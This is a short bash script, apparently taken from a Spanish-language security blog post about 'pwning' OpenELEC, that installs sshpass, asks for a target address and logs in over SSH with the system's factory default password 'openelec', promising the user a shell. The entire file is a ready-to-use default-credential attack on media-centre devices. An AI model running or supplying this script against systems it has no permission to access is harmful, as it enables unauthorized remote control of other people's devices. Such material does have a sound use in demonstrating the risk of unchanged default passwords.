#!/bin/bash
#Script realizado por @BalderramaEric http://www.sniferl4bs.com/2016/02/pwneando-openelec.html
sudo apt-get install sshpass

echo 'Ingrese target: '
read target
echo 'Banca que ya te doy la shell'
sshpass -p openelec ssh $target

